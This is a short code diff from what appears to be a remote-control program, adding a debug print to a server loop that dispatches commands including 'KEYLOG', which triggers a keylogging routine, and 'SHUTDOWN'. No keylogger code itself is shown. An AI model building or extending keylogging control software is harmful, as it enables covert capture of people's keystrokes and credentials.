@@ -440,6 +440,7 @@ class Server:
 
             while True:
                 s = self.receiveSignal()
+                print(s)
                 if s == "KEYLOG":
                     self.keylog()
                 elif s == "SHUTDOWN":
